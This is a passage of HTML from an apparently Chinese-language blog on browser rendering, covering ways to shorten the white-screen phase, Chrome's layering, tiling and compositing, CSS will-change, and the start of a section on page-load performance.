DOM，然后合成布局树，最后还要经过一系列的步骤准备首次渲染。</li>\n<li>第三个阶段，等首次渲染完成之后，就开始进入完整页面的生成阶段了，然后页面会一点点被绘制出来。</li>\n</ul>\n<p>影响第一个阶段的因素主要是网络或者是服务器处理这块儿，前面文章中我们已经讲过了，这里我们就不再继续分析了。至于第三个阶段，我们会在后续文章中分析，所以这里也不做介绍了。</p>\n<p>现在我们重点关注第二个阶段，这个阶段的主要问题是白屏时间，如果白屏时间过久，就会影响到用户体验。为了缩短白屏时间，我们来挨个分析这个阶段的主要任务，包括了解析 HTML、下载 CSS、下载 JavaScript、生成 CSSOM、执行 JavaScript、生成布局树、绘制页面一系列操作。</p>\n<p>通常情况下的瓶颈主要体现在下载 CSS 文件、下载 JavaScript 文件和执行 JavaScript。</p>\n<p>所以要想缩短白屏时长，可以有以下策略</p>\n<ul>\n<li>通过内联 JavaScript、内联 CSS 来移除这两种类型的文件下载，这样获取到 HTML 文件之后就可以直接开始渲染流程了。</li>\n<li>但并不是所有的场合都适合内联，那么还可以尽量减少文件大小，比如通过 webpack 等工具移除一些不必要的注释，并压缩 JavaScript 文件。</li>\n<li>还可以将一些不需要在解析 HTML 阶段使用的 JavaScript 标记上 async 或者 defer。</li>\n<li>对于大的 CSS 文件，可以通过媒体查询属性，将其拆分为多个不同用途的 CSS 文件，这样只有在特定的场景下才会加载特定的 CSS 文件。</li>\n</ul>\n<p>通过以上策略就能缩短白屏展示的时长了，不过在实际项目中，总是存在各种各样的情况，这些策略并不能随心所欲地去引用，所以还需要结合实际情况来调整最佳方案。</p>\n<h2 id="总结-2"><a href="#%E6%80%BB%E7%BB%93-2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们首先介绍了 CSS 在渲染流水线中的位置，以及 CSS 是如何影响到渲染流程的；接下来我们通过渲染流水线分析了从发出请求到页面首次绘制的三个阶段；最后重点介绍了第二个白屏阶段以及优化该阶段的一些策略。通过今天的内容我们可以知道虽然 JavaScript 和 CSS 给我们带来了极大的便利，不过也对页面的渲染带来了很多的限制，所以我们要关注资源加载速度，需要小心翼翼地处理各种资源之间的关联关系。</p>\n<h1 id="分层和合成机制：为什么-css-动画比-javascript-高效"><a href="#%E5%88%86%E5%B1%82%E5%92%8C%E5%90%88%E6%88%90%E6%9C%BA%E5%88%B6%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88-css-%E5%8A%A8%E7%94%BB%E6%AF%94-javascript-%E9%AB%98%E6%95%88" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>分层和合成机制：为什么 css 动画比 JavaScript 高效</h1>\n<p>本文我们主要讲解渲染引擎的分层和合成机制，因为分层和合成机制代表了浏览器最为先进的合成技术，Chrome 团队为了做到这一点，做了大量的优化工作。了解其工作原理，有助于拓宽你的视野，而且也有助于你更加深刻地理解 CSS 动画和 JavaScript 底层工作机制。</p>\n<h2 id="显示器是怎么显示图像的"><a href="#%E6%98%BE%E7%A4%BA%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E6%98%BE%E7%A4%BA%E5%9B%BE%E5%83%8F%E7%9A%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>显示器是怎么显示图像的</h2>\n<p>每个显示器都有固定的刷新频率，通常是 60HZ，也就是每秒更新 60 张图片，更新的图片都来自于显卡中一个叫前缓冲区的地方，显示器所做的任务很简单，就是每秒固定读取 60 次前缓冲区中的图像，并将读取的图像显示到显示器上。</p>\n<p>那么这里显卡做什么呢？</p>\n<p>显卡的职责就是合成新的图像，并将图像保存到后缓冲区中，一旦显卡把合成的图像写到后缓冲区，系统就会让后缓冲区和前缓冲区互换，这样就能保证显示器能读取到最新显卡合成的图像。通常情况下，显卡的更新频率和显示器的刷新频率是一致的。但有时候，在一些复杂的场景中，显卡处理一张图片的速度会变慢，这样就会造成视觉上的卡顿。</p>\n<h2 id="帧-vs-帧率"><a href="#%E5%B8%A7-vs-%E5%B8%A7%E7%8E%87" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>帧 VS 帧率</h2>\n<p>了解了显示器是怎么显示图像的之后，下面我们再来明确下帧和帧率的概念，因为这是后续一切分析的基础。</p>\n<p>当你通过滚动条滚动页面，或者通过手势缩放页面时，屏幕上就会产生动画的效果。之所以你能感觉到有动画的效果，是因为在滚动或者缩放操作时，渲染引擎会通过渲染流水线生成新的图片，并发送到显卡的后缓冲区。</p>\n<p>大多数设备屏幕的更新频率是 60 次 / 秒，这也就意味着正常情况下要实现流畅的动画效果，渲染引擎需要每秒更新 60 张图片到显卡的后缓冲区。</p>\n<p>我们把渲染流水线生成的每一副图片称为一帧，把渲染流水线每秒更新了多少帧称为帧率，比如滚动过程中 1 秒更新了 60 帧，那么帧率就是 60Hz（或者 60FPS）。</p>\n<p>由于用户很容易观察到那些丢失的帧，如果在一次动画过程中，渲染引擎生成某些帧的时间过久，那么用户就会感受到卡顿，这会给用户造成非常不好的印象。</p>\n<p>要解决卡顿问题，就要解决每帧生成时间过久的问题，为此 Chrome 对浏览器渲染方式做了大量的工作，其中最卓有成效的策略就是引入了分层和合成机制。分层和合成机制代表了当今最先进的渲染技术，所以接下来我们就来分析下什么是合成和渲染技术</p>\n<h2 id="如何生成一帧图像"><a href="#%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90%E4%B8%80%E5%B8%A7%E5%9B%BE%E5%83%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何生成一帧图像</h2>\n<p>不过在开始之前，我们还需要聊一聊渲染引擎是如何生成一帧图像的。这需要回顾下我们前面介绍的渲染流水线。关于其中任意一帧的生成方式，有重排、重绘和合成三种方式</p>\n<p>这三种方式的渲染路径是不同的，通常渲染路径越长，生成图像花费的时间就越多。比如重排，它需要重新根据 CSSOM 和 DOM 来计算布局树，这样生成一幅图片时，会让整个渲染流水线的每个阶段都执行一遍，如果布局复杂的话，就很难保证渲染的效率了。而重绘因为没有了重新布局的阶段，操作效率稍微高点，但是依然需要重新计算绘制信息，并触发绘制操作之后的一系列操作。</p>\n<p>相较于重排和重绘，合成操作的路径就显得非常短了，并不需要触发布局和绘制两个阶段，如果采用了 GPU，那么合成的效率会非常高。</p>\n<p>所以，关于渲染引擎生成一帧图像的几种方式，按照效率我们推荐合成方式优先，若实在不能满足需求，那么就再退后一步使用重绘或者重排的方式。</p>\n<p>本文我们的焦点在合成上，所以接下来我们就来深入分析下 Chrome 浏览器是怎么实现合成操作的。Chrome 中的合成技术，可以用三个词来概括总结：分层、分块和合成</p>\n<h2 id="分层和合成"><a href="#%E5%88%86%E5%B1%82%E5%92%8C%E5%90%88%E6%88%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>分层和合成</h2>\n<p>通常页面的组成是非常复杂的，有的页面里要实现一些复杂的动画效果，比如点击菜单时弹出菜单的动画特效，滚动鼠标滚轮时页面滚动的动画效果，当然还有一些炫酷的 3D 动画特效。如果没有采用分层机制，从布局树直接生成目标图片的话，那么每次页面有很小的变化时，都会触发重排或者重绘机制，这种“牵一发而动全身”的绘制策略会严重影响页面的渲染效率。</p>\n<p>为了提升每帧的渲染效率，Chrome 引入了分层和合成的机制。那该怎么来理解分层和合成机制呢？</p>\n<p>你可以把一张网页想象成是由很多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终将这些图层合成了用于显示页面的图片。如果你熟悉 PhotoShop 的话，就能很好地理解这个过程了，PhotoShop 中一个项目是由很多图层构成的，每个图层都可以是一张单独图片，可以设置透明度、边框阴影，可以旋转或者设置图层的上下位置，将这些图层叠加在一起后，就能呈现出最终的图片了。</p>\n<p>在这个过程中，将素材分解为多个图层的操作就称为分层，最后将这些图层合并到一起的操作就称为合成。所以，分层和合成通常是一起使用的。</p>\n<p>考虑到一个页面被划分为两个层，当进行到下一帧的渲染时，上面的一帧可能需要实现某些变换，如平移、旋转、缩放、阴影或者 Alpha 渐变，这时候合成器只需要将两个层进行相应的变化操作就可以了，显卡处理这些操作驾轻就熟，所以这个合成过程时间非常短。</p>\n<p>理解了为什么要引入合成和分层机制，下面我们再来看看 Chrome 是怎么实现分层和合成机制的。</p>\n<p>在 Chrome 的渲染流水线中，分层体现在生成布局树之后，渲染引擎会根据布局树的特点将其转换为层树（Layer Tree），层树是渲染流水线后续流程的基础结构。</p>\n<p>层树中的每个节点都对应着一个图层，下一步的绘制阶段就依赖于层树中的节点。在前面我们介绍过，绘制阶段其实并不是真正地绘出图片，而是将绘制指令组合成一个列表，比如一个图层要设置的背景为黑色，并且还要在中间画一个圆形，那么绘制过程会生成|Paint BackGroundColor:Black | Paint Circle|这样的绘制指令列表，绘制过程就完成了。</p>\n<p>有了绘制列表之后，就需要进入光栅化阶段了，光栅化就是按照绘制列表中的指令生成图片。每一个图层都对应一张图片，合成线程有了这些图片之后，会将这些图片合成为“一张”图片，并最终将生成的图片发送到后缓冲区。这就是一个大致的分层、合成流程。</p>\n<p>需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的。这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。</p>\n<h2 id="分块"><a href="#%E5%88%86%E5%9D%97" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>分块</h2>\n<p>如果说分层是从宏观上提升了渲染效率，那么分块则是从微观层面提升了渲染效率。</p>\n<p>通常情况下，页面的内容都要比屏幕大得多，显示一个页面时，如果等待所有的图层都生成完毕，再进行合成的话，会产生一些不必要的开销，也会让合成图片的时间变得更久。</p>\n<p>因此，合成线程会将每个图层分割为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以大大加速页面的显示速度。不过有时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素——纹理上传，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。</p>\n<p>为了解决这个问题，Chrome 又采取了一个策略：在首次合成图块的时候使用一个低分辨率的图片。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。这种方式尽管会让用户在开始时看到的是低分辨率的内容，但是也比用户在开始时什么都看不到要好</p>\n<h2 id="如何利用分层技术优化代码"><a href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%88%86%E5%B1%82%E6%8A%80%E6%9C%AF%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何利用分层技术优化代码</h2>\n<p>通过上面的介绍，相信你已经理解了渲染引擎是怎么将布局树转换为漂亮图片的，理解其中原理之后，你就可以利用分层和合成技术来优化代码了。</p>\n<p>在写 Web 应用的时候，你可能经常需要对某个元素做几何形状变换、透明度变换或者一些缩放操作，如果使用 JavaScript 来写这些效果，会牵涉到整个渲染流水线，所以 JavaScript 的绘制效率会非常低下。</p>\n<p>这时你可以使用 will-change 来告诉渲染引擎你会对该元素做一些特效变换，CSS 代码如下：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="54317030841430670000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`.box {\n  will-change: transform, opacity;\n}`, `54317030841430670000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                css 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.box</span> <span class="token punctuation">{</span>\n  <span class="token property">will-change</span><span class="token punctuation">:</span> transform<span class="token punctuation">,</span> opacity<span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<p>这段代码就是提前告诉渲染引擎 box 元素将要做几何变换和透明度变换操作，这时候渲染引擎会将该元素单独实现一帧，等这些变换发生时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就大大提升了渲染的效率。这也是 CSS 动画比 JavaScript 动画高效的原因。</p>\n<p>所以，如果涉及到一些可以使用合成线程来处理 CSS 特效或者动画的情况，就尽量使用 will-change 来提前告诉渲染引擎，让它为该元素准备独立的层。但是凡事都有两面性，每当渲染引擎为一个元素准备一个独立层的时候，它占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，这些都需要额外的内存，所以你需要恰当地使用 will-change。</p>\n<h2 id="总结-3"><a href="#%E6%80%BB%E7%BB%93-3" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<ul>\n<li>首先我们介绍了显示器显示图像的原理，以及帧和帧率的概念，然后基于帧和帧率我们又介绍渲染引擎是如何实现一帧图像的。通常渲染引擎生成一帧图像有三种方式：重排、重绘和合成。其中重排和重绘操作都是在渲染进程的主线程上执行的，比较耗时；而合成操作是在渲染进程的合成线程上执行的，执行速度快，且不占用主线程。</li>\n<li>然后我们重点介绍了浏览器是怎么实现合成的，其技术细节主要可以使用三个词来概括：分层、分块和合成。</li>\n<li>最后我们还讲解了 CSS 动画比 JavaScript 动画高效的原因，以及怎么使用 will-change 来优化动画或特效。</li>\n</ul>\n<h1 id="页面性能：如何系统优化页面"><a href="#%E9%A1%B5%E9%9D%A2%E6%80%A7%E8%83%BD%EF%BC%9A%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96%E9%A1%B5%E9%9D%A2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>页面性能：如何系统优化页面</h1>\n<p>在前面几篇文章中，我们分析了页面加载和 DOM 生成，讨论了 JavaScript 和 CSS 是如何影响到 DOM 生成的，还结合渲染流水线来讲解了分层和合成机制，同时在这些文章里面，我们还穿插说明了很多优化页面性能的最佳实践策略。通过这些知识点的学习，相信你已经知道渲染引擎是怎么绘制出帧的，不过之前我们介绍的内容比较零碎、比较散，那么今天我们就来将这些内容系统性地串起来。</p>\n<p>那么怎么才能把这些知识点串起来呢？我的思路是从如何系统优化页面速度的角度来切入。</p>\n<p>这里我们所谈论的页面优化，其实就是要让页面更快地显示和响应。由于一个页面在它不同的阶段，所侧重的关注点是不一样的，所以如果我们要讨论页面优化，就要分析一个页面生存周期的不同阶段。</p>\n<p>通常一个页面有三个阶段：加载阶段、交互阶段和关闭阶段</p>\n<ul>\n<li>加载阶段，是指从发出请求到渲染出完整页面的过程，影响到这个阶段的主要因素有网络和 JavaScript 脚本。</li>\n<li>交互阶段，主要是从页面加载完成到用户交互的整合过程，影响到这个阶段的主要因素是 JavaScript 脚本。</li>\n<li>关闭阶段，主要是用户发出关闭指令后页面所做的一些清理操作</li>\n</ul>\n<p>这里我们需要重点关注加载阶段和交互阶段，因为影响到我们体验的因素主要都在这两个阶段，下面我们就来逐个详细分析下。</p>\n<h2 id="加载阶段"><a href="#%E5%8A%A0%E8%BD%BD%E9%98%B6%E6%AE%B5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>加载阶段</h2>\n<p>我们先来分析如何系统优化加载阶段中的页面，还是先看一个典型的渲染流水线，如下图所示</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-21-14-ad68a5cc5c801a3043467e68c88c21e3-0d494.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 50.81967213114754%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB7klEQVQoz22P7W/SUBTG+9f6L/jN+Gku0Rg1MWSZOux46wvCgi5iYqYTZR2MwQYUSm9774UyIhS6i9D29gVbdJ/05JeTJ885J08Os9lsQt/3ya2/jPHIliXxYodQYv1xtiPLu1vwiRW4DuMF4QzpIJ9ReLaTOVDFFBAPNSGpial2+g0u5oCQ1EW2ye4r3NtB7vWAZ2WOVbIHlnzN2C7Fcmf8XoTvMip/2M8m1bzYKHzCR2KfT6lcupIuXucLuphSBP40W5L5NBBTOJ8mvXacbGJ4U8hgPjkpibDAdl89qLFPEbevZ57B3MMG+6iXTUz4PSzsNLmXWGAnxZzBJUm3xUQ/B45jg76NtOnnj73Ertk4WtQFCjvLVuVq596iknNBw4E9JXF/lH9OsWpriqP2/bnJeJ5nWpY2Xwwscvnt5PjFk5YxvdBGeO3IeFh4vNsFcGhTwwvKe4lquWz4ISJEJ8uF4zD2et0H4EunfVyTzhCsj43TXver3C5Vf3yoSfWb8TmCkq6daaD5cyIhWNWABPXvQEVRchAEUXJzNGxgFHGBUR3Bc107uWpFSECNdA3qdajHWgOXo2FEHSPDWmx/DsMVdf/ixvxynKivKV1RGvfI2bK6I9LU9+PjMAw3/9StZc2mU3M2m5smdd3N/+o3E90AS1dAFl4AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 21 14"\n        title=""\n        src="/static/2021-07-13-09-21-14-ad68a5cc5c801a3043467e68c88c21e3-fee1c.png"\n        srcset="/static/2021-07-13-09-21-14-ad68a5cc5c801a3043467e68c88c21e3-a67b7.png 200w,\n/static/2021-07-13-09-21-14-ad68a5cc5c801a3043467e68c88c21e3-0b187.png 400w,\n/static/2021-07-13-09-21-14-ad68a5cc5c801a3043467e68c88c21e3-fee1c.png 800w,\n/static/2021-07-13-09-21-14-ad68a5cc5c801a3043467e68c88c21e3-b1a91.png 1200w,\n/static/2021-07-13-09-21-14-ad68a5cc5c801a3043467e68c88c21e3-0d494.png 1464w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>观察上面这个渲染流水线，你能分析出来有哪些因素影响了页面加载速度吗？下面我们就先来分析下这个问题。</p>\n<p>通过前面文章的讲解，你应该已经知道了并非所有的资源都会阻塞页面的首次绘制，比如图片、音频、视频等文件就不会阻塞页面的首次渲染；而 JavaScript、首次请求的 HTML 资源文件、CSS 文件是会阻塞首次渲染的，因为在构建 DOM 的过程中需要 HTML 和 JavaScript 文件，在构造渲染树的过程中需要用到 CSS 文件。</p>\n<p>我们把这些能阻塞网页首次渲染的资源称为关键资源。基于关键资源，我们可以继续细化出来三个影响页面首次渲染的核心因素。</p>\n<h3 id="核心因素"><a href="#%E6%A0%B8%E5%BF%83%E5%9B%A0%E7%B4%A0" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>核心因素</h3>\n<h4 id="关键资源个数"><a href="#%E5%85%B3%E9%94%AE%E8%B5%84%E6%BA%90%E4%B8%AA%E6%95%B0" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>关键资源个数</h4>\n<p>关键资源个数越多，首次页面的加载时间就会越长。比如上图中的关键资源个数就是 3 个，1 个 HTML 文件、1 个 JavaScript 和 1 个 CSS 文件。</p>\n<h4 id="关键资源大小"><a href="#%E5%85%B3%E9%94%AE%E8%B5%84%E6%BA%90%E5%A4%A7%E5%B0%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>关键资源大小</h4>\n<p>通常情况下，所有关键资源的内容越小，其整个资源的下载时间也就越短，那么阻塞渲染的时间也就越短。上图中关键资源的大小分别是 6KB、8KB 和 9KB，那么整个关键资源大小就是 23KB。</p>\n<h4 id="请求关键资源"><a href="#%E8%AF%B7%E6%B1%82%E5%85%B3%E9%94%AE%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 